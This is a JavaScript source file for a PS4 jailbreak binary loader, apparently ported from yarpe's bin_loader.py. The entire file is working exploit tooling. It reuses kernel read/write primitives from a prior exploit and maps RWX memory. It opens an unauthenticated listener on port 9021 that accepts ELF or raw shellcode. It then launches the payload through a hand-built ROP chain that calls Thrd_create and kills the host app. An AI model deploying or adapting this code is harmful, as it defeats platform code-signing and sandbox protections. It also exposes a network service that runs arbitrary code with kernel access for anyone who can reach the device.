// bin_loader_ps4.js - ELF/binary loader for PS4 after jailbreak
// Port of bin_loader.py from yarpe
// Loads and executes ELF binaries sent over socket after jailbreak is complete

// Constants
const BIN_LOADER_PORT = 9021;
const MAX_PAYLOAD_SIZE = 4 * 1024 * 1024;  // 4MB max
const READ_CHUNK = 32768;  // 32KB chunks for faster transfer

// Thrd_create offset in libc.prx (verified via Ghidra)
const THRD_CREATE_OFFSET = 0x4c770n;

// ELF magic bytes
const ELF_MAGIC = 0x464C457F;  // "\x7fELF" as little-endian uint32

// mmap constants
const BL_MAP_PRIVATE = 0x2n;
const BL_MAP_ANONYMOUS = 0x1000n;
const BL_PROT_READ = 0x1n;
const BL_PROT_WRITE = 0x2n;
const BL_PROT_EXEC = 0x4n;

// Socket constants
const BL_AF_INET = 2n;
const BL_SOCK_STREAM = 1n;
const BL_SOL_SOCKET = 0xffffn;
const BL_SO_REUSEADDR = 4n;

// Syscall numbers (must match SYSCALL in lapse_ps4.js)
const BL_SYSCALL = {
    read: 0x3,
    write: 0x4,
    close: 0x6,
    socket: 0x61,
    bind: 0x68,
    listen: 0x6a,
    accept: 0x1e,
    getsockname: 0x20,
    setsockopt: 0x69,
    mmap: 0x1dd,      // 477
    munmap: 0x49,
    getuid: 0x18,
    getpid: 0x14,
    kill: 0x25,
    nanosleep: 0xf0,
    is_in_sandbox: 0x249,
};

// Note: When integrated into lapse_ps4.js, use SYSCALL instead of BL_SYSCALL

// ELF header structure offsets
const ELF_HEADER = {
    E_ENTRY: 0x18,
    E_PHOFF: 0x20,
    E_PHENTSIZE: 0x36,
    E_PHNUM: 0x38,
};

// Program header structure offsets
const PROGRAM_HEADER = {
    P_TYPE: 0x00,
    P_FLAGS: 0x04,
    P_OFFSET: 0x08,
    P_VADDR: 0x10,
    P_FILESZ: 0x20,
    P_MEMSZ: 0x28,
};

const PT_LOAD = 1;

// Helper: Check if we're jailbroken
function bl_is_jailbroken() {
    const uid = syscall(BigInt(BL_SYSCALL.getuid));
    const sandbox = syscall(BigInt(BL_SYSCALL.is_in_sandbox));
    return uid === 0n && sandbox === 0n;
}

// Helper: Round up to page boundary
function bl_round_up(x, base) {
    return Math.floor((x + base - 1) / base) * base;
}

// Helper: Check for syscall error
function bl_is_error(val) {
    if (typeof val === 'bigint') {
        return val === 0xffffffffffffffffn || val >= 0xffffffff00000000n;
    }
    return val === -1 || val === 0xffffffff;
}

// Fast memory copy - copies in 8-byte chunks, then remaining bytes
function bl_fast_copy(dst, src, len) {
    const qwords = Math.floor(len / 8);
    const remainder = len % 8;

    // Copy 8 bytes at a time
    for (let i = 0; i < qwords; i++) {
        const val = read64_uncompressed(src + BigInt(i * 8));
        write64_uncompressed(dst + BigInt(i * 8), val);
    }

    // Copy remaining bytes
    const base = qwords * 8;
    for (let i = 0; i < remainder; i++) {
        const byte = read8_uncompressed(src + BigInt(base + i));
        write8_uncompressed(dst + BigInt(base + i), byte);
    }
}

// Fast memory zero - zeroes in 8-byte chunks, then remaining bytes
function bl_fast_zero(dst, len) {
    const qwords = Math.floor(len / 8);
    const remainder = len % 8;

    // Zero 8 bytes at a time
    for (let i = 0; i < qwords; i++) {
        write64_uncompressed(dst + BigInt(i * 8), 0n);
    }

    // Zero remaining bytes
    const base = qwords * 8;
    for (let i = 0; i < remainder; i++) {
        write8_uncompressed(dst + BigInt(base + i), 0);
    }
}

// Read ELF header from buffer
function bl_read_elf_header(buf_addr) {
    return {
        magic: Number(read32_uncompressed(buf_addr)),
        e_entry: read64_uncompressed(buf_addr + BigInt(ELF_HEADER.E_ENTRY)),
        e_phoff: read64_uncompressed(buf_addr + BigInt(ELF_HEADER.E_PHOFF)),
        e_phentsize: Number(read16_uncompressed(buf_addr + BigInt(ELF_HEADER.E_PHENTSIZE))),
        e_phnum: Number(read16_uncompressed(buf_addr + BigInt(ELF_HEADER.E_PHNUM))),
    };
}

// Read program header from buffer
function bl_read_program_header(buf_addr, offset) {
    const base = buf_addr + BigInt(offset);
    return {
        p_type: Number(read32_uncompressed(base + BigInt(PROGRAM_HEADER.P_TYPE))),
        p_flags: Number(read32_uncompressed(base + BigInt(PROGRAM_HEADER.P_FLAGS))),
        p_offset: read64_uncompressed(base + BigInt(PROGRAM_HEADER.P_OFFSET)),
        p_vaddr: read64_uncompressed(base + BigInt(PROGRAM_HEADER.P_VADDR)),
        p_filesz: read64_uncompressed(base + BigInt(PROGRAM_HEADER.P_FILESZ)),
        p_memsz: read64_uncompressed(base + BigInt(PROGRAM_HEADER.P_MEMSZ)),
    };
}

// Load ELF segments into mmap'd memory
function bl_load_elf_segments(buf_addr, base_addr) {
    const elf = bl_read_elf_header(buf_addr);

    logger.log("ELF: " + elf.e_phnum + " segments, entry @ " + hex(elf.e_entry));

    for (let i = 0; i < elf.e_phnum; i++) {
        const phdr_offset = Number(elf.e_phoff) + i * elf.e_phentsize;
        const segment = bl_read_program_header(buf_addr, phdr_offset);

        if (segment.p_type === PT_LOAD && segment.p_memsz > 0n) {
            // Use lower 24 bits of vaddr to get offset within region
            const seg_offset = segment.p_vaddr & 0xffffffn;
            const seg_addr = base_addr + seg_offset;

            // Reduced logging for speed - uncomment for debug
            // logger.log("Seg " + i + ": " + hex(segment.p_filesz) + " -> " + hex(seg_addr));

            // Copy segment data using fast 8-byte copy
            const filesz = Number(segment.p_filesz);
            const src_addr = buf_addr + segment.p_offset;
            bl_fast_copy(seg_addr, src_addr, filesz);

            // Zero remaining memory (memsz - filesz) using fast zero
            const memsz = Number(segment.p_memsz);
            if (memsz > filesz) {
                bl_fast_zero(seg_addr + BigInt(filesz), memsz - filesz);
            }
        }
    }

    // Return entry point address
    const entry_offset = elf.e_entry & 0xffffffn;
    return base_addr + entry_offset;
}

// BinLoader object
const BinLoader = {
    data: null,
    data_size: 0,
    mmap_base: 0n,
    mmap_size: 0,
    entry_point: 0n,
};

BinLoader.init = function(bin_data_addr, bin_size) {
    BinLoader.data = bin_data_addr;
    BinLoader.data_size = bin_size;

    // Calculate mmap size (round up to page boundary)
    BinLoader.mmap_size = bl_round_up(bin_size, PAGE_SIZE);

    // Allocate RWX memory
    const prot = BL_PROT_READ | BL_PROT_WRITE | BL_PROT_EXEC;
    const flags = BL_MAP_PRIVATE | BL_MAP_ANONYMOUS;

    const ret = syscall(
        BigInt(BL_SYSCALL.mmap),
        0n,
        BigInt(BinLoader.mmap_size),
        prot,
        flags,
        0xffffffffffffffffn,  // fd = -1
        0n
    );

    if (ret >= 0xffff800000000000n) {
        throw new Error("mmap failed: " + hex(ret));
    }

    BinLoader.mmap_base = ret;
    logger.log("mmap() allocated at: " + hex(BinLoader.mmap_base));

    // Check for ELF magic
    const magic = Number(read32_uncompressed(bin_data_addr));

    if (magic === ELF_MAGIC) {
        logger.log("Detected ELF binary, parsing headers...");
        BinLoader.entry_point = bl_load_elf_segments(bin_data_addr, BinLoader.mmap_base);
    } else {
        logger.log("Non-ELF binary, treating as raw shellcode (" + bin_size + " bytes)");
        bl_fast_copy(BinLoader.mmap_base, bin_data_addr, bin_size);
        BinLoader.entry_point = BinLoader.mmap_base;
    }

    logger.log("Entry point: " + hex(BinLoader.entry_point));
};

// Spawn payload thread and kill process using ROP
function spawn_payload_thread_and_wait(entry_point, args) {
    // Get Thrd_create address from libc
    const Thrd_create = libc_base + THRD_CREATE_OFFSET;
    logger.log("libc_base @ " + hex(libc_base));
    logger.log("Thrd_create @ " + hex(Thrd_create));

    // Get our PID for SIGKILL
    const pid = syscall(BigInt(BL_SYSCALL.getpid));
    logger.log("Our PID: " + pid);

    // Allocate structures
    const thr_handle_addr = malloc(8);
    const timespec_addr = malloc(16);

    // Setup timespec for nanosleep: 0.5 second delay to let thread start
    write64_uncompressed(timespec_addr, 0n);           // tv_sec = 0
    write64_uncompressed(timespec_addr + 8n, 500000000n);  // tv_nsec = 500ms

    // Build args structure for the payload
    const rwpipe = malloc(8);
    const rwpair = malloc(8);

    write32_uncompressed(rwpipe, ipv6_kernel_rw.data.pipe_read_fd);
    write32_uncompressed(rwpipe + 0x4n, ipv6_kernel_rw.data.pipe_write_fd);

    write32_uncompressed(rwpair, Number(ipv6_kernel_rw.data.master_sock));
    write32_uncompressed(rwpair + 0x4n, Number(ipv6_kernel_rw.data.victim_sock));

    // Args structure for payload:
    // arg1 = syscall_wrapper
    // arg2 = rwpipe (pipe fds)
    // arg3 = rwpair (socket fds)
    // arg4 = pipe kernel addr
    // arg5 = kernel data base
    // arg6 = output ptr
    const payloadout = malloc(4);
    write64_uncompressed(args + 0x00n, syscall_wrapper - 0x7n);
    write64_uncompressed(args + 0x08n, rwpipe);
    write64_uncompressed(args + 0x10n, rwpair);
    write64_uncompressed(args + 0x18n, ipv6_kernel_rw.data.pipe_addr);
    write64_uncompressed(args + 0x20n, kernel.addr.base);
    write64_uncompressed(args + 0x28n, payloadout);

    // Note: Exploit cleanup (sds, sds_alt, block_fd, etc.) is done in lapse.js
    // We keep the kernel r/w sockets/pipes open since payload may need them

    // Set up ROP chain
    write64(add_rop_smash_code_store, 0xab0025n);
    real_rbp = addrof(rop_smash(1)) + 0x700000000n + 1n;

    let i = 0;

    // =====================================================
    // Part 1: Thrd_create(thr_handle_addr, entry_point, args)
    // =====================================================
    fake_rop[i++] = eboot_base + g.pop_rdi;
    fake_rop[i++] = thr_handle_addr;
    fake_rop[i++] = eboot_base + g.pop_rsi;
    fake_rop[i++] = entry_point;
    fake_rop[i++] = eboot_base + g.pop_rdx;
    fake_rop[i++] = args;
    fake_rop[i++] = eboot_base + g.pop_rcx;
    fake_rop[i++] = 0n;
    fake_rop[i++] = eboot_base + g.pop_r8;
    fake_rop[i++] = 0n;
    fake_rop[i++] = eboot_base + g.pop_r9;
    fake_rop[i++] = 0n;
    fake_rop[i++] = Thrd_create;

    // =====================================================
    // Part 2: nanosleep to let thread initialize
    // =====================================================
    fake_rop[i++] = eboot_base + g.pop_rdi;
    fake_rop[i++] = timespec_addr;
    fake_rop[i++] = eboot_base + g.pop_rsi;
    fake_rop[i++] = 0n;
    fake_rop[i++] = eboot_base + g.pop_rax;
    fake_rop[i++] = BigInt(BL_SYSCALL.nanosleep);
    fake_rop[i++] = syscall_wrapper;

    // =====================================================
    // Part 3: SIGKILL just our process (Netflix app)
    // Don't use negative PID - that kills the whole process group including ShellUI!
    // =====================================================
    fake_rop[i++] = eboot_base + g.pop_rdi;
    fake_rop[i++] = pid;  // Just our PID, not process group
    fake_rop[i++] = eboot_base + g.pop_rsi;
    fake_rop[i++] = 9n;  // SIGKILL
    fake_rop[i++] = eboot_base + g.pop_rax;
    fake_rop[i++] = BigInt(BL_SYSCALL.kill);
    fake_rop[i++] = syscall_wrapper;

    // Note: We won't reach here - SIGKILL terminates us
    // The payload thread continues running independently

    logger.log("ROP chain built");
    logger.log("Triggering: Thrd_create -> nanosleep -> SIGKILL");

    // Trigger the ROP chain
    write64(add_rop_smash_code_store, 0xab00260325n);
    fake_rw[59] = (fake_frame & 0xffffffffn);
    rop_smash(fake_obj_arr[0]);

    // We won't reach here
    logger.log("ERROR: Should not reach here after SIGKILL");
}

BinLoader.run = function() {
    logger.log("Spawning payload thread...");

    const args = malloc(0x30);
    spawn_payload_thread_and_wait(BinLoader.entry_point, args);
};

// Create listening socket
function bl_create_listen_socket(port) {
    const sd = syscall(BigInt(BL_SYSCALL.socket), BL_AF_INET, BL_SOCK_STREAM, 0n);
    if (bl_is_error(sd)) {
        throw new Error("socket() failed");
    }

    // Set SO_REUSEADDR
    const enable = malloc(4);
    write32_uncompressed(enable, 1);
    syscall(BigInt(BL_SYSCALL.setsockopt), sd, BL_SOL_SOCKET, BL_SO_REUSEADDR, enable, 4n);

    // Build sockaddr_in
    const sockaddr = malloc(16);
    for (let j = 0; j < 16; j++) {
        write8_uncompressed(sockaddr + BigInt(j), 0);
    }
    write8_uncompressed(sockaddr + 1n, 2);  // AF_INET
    write8_uncompressed(sockaddr + 2n, (port >> 8) & 0xff);  // port high byte
    write8_uncompressed(sockaddr + 3n, port & 0xff);         // port low byte
    write32_uncompressed(sockaddr + 4n, 0);  // INADDR_ANY

    let ret = syscall(BigInt(BL_SYSCALL.bind), sd, sockaddr, 16n);
    if (bl_is_error(ret)) {
        syscall(BigInt(BL_SYSCALL.close), sd);
        throw new Error("bind() failed");
    }

    ret = syscall(BigInt(BL_SYSCALL.listen), sd, 1n);
    if (bl_is_error(ret)) {
        syscall(BigInt(BL_SYSCALL.close), sd);
        throw new Error("listen() failed");
    }

    return sd;
}

// Read payload data from client socket
function bl_read_payload_from_socket(client_sock, max_size) {
    const payload_buf = malloc(max_size);
    let total_read = 0;

    while (total_read < max_size) {
        // Read directly into payload buffer at current offset
        const remaining = max_size - total_read;
        const chunk_size = remaining < READ_CHUNK ? remaining : READ_CHUNK;

        const read_size = syscall(
            BigInt(BL_SYSCALL.read),
            BigInt(client_sock),
            payload_buf + BigInt(total_read),  // Read directly to destination
            BigInt(chunk_size)
        );

        if (bl_is_error(read_size)) {
            throw new Error("read() failed");
        }

        if (read_size === 0n) {
            break;  // EOF
        }

        total_read += Number(read_size);

        // Progress update every 128KB
        if (total_read % (128 * 1024) === 0) {
            logger.log("Received " + (total_read / 1024) + " KB...");
        }
    }

    return { buf: payload_buf, size: total_read };
}

// Main bin_loader function
function bin_loader_main() {
    logger.log("=== PS4 Binary Loader ===");

    if (!bl_is_jailbroken()) {
        logger.log("ERROR: Console is not jailbroken");
        send_notification("Jailbreak failed!\nNot jailbroken.");
        return false;
    }

    logger.log("Console is jailbroken, starting payload server...");

    let server_sock;
    try {
        server_sock = bl_create_listen_socket(BIN_LOADER_PORT);
    } catch (e) {
        logger.log("ERROR: " + e.message);
        send_notification("Bin loader failed!\n" + e.message);
        return false;
    }

    // Get current IP and notify user
    const current_ip = get_current_ip();
    const network_str = (current_ip ? current_ip : "<PS4 IP>") + ":" + BIN_LOADER_PORT;

    logger.log("Listening on " + network_str);
    logger.log("Send your ELF payload to this address");
    send_notification("Binloader listening on:\n" + network_str);

    // Accept client connection
    const sockaddr = malloc(16);
    const sockaddr_len = malloc(4);
    write32_uncompressed(sockaddr_len, 16);

    const client_sock = syscall(
        BigInt(BL_SYSCALL.accept),
        server_sock,
        sockaddr,
        sockaddr_len
    );

    if (bl_is_error(client_sock)) {
        logger.log("ERROR: accept() failed");
        syscall(BigInt(BL_SYSCALL.close), server_sock);
        return false;
    }

    logger.log("Client connected");

    let payload;
    try {
        payload = bl_read_payload_from_socket(Number(client_sock), MAX_PAYLOAD_SIZE);
    } catch (e) {
        logger.log("ERROR reading payload: " + e.message);
        syscall(BigInt(BL_SYSCALL.close), client_sock);
        syscall(BigInt(BL_SYSCALL.close), server_sock);
        return false;
    }

    logger.log("Received " + payload.size + " bytes total");

    syscall(BigInt(BL_SYSCALL.close), client_sock);
    syscall(BigInt(BL_SYSCALL.close), server_sock);

    if (payload.size < 64) {
        logger.log("ERROR: Payload too small");
        return false;
    }

    try {
        BinLoader.init(payload.buf, payload.size);
        BinLoader.run();
        logger.log("Payload spawned successfully");
    } catch (e) {
        logger.log("ERROR loading payload: " + e.message);
        if (e.stack) logger.log(e.stack);
        return false;
    }

    return true;
}
bin_loader_main()
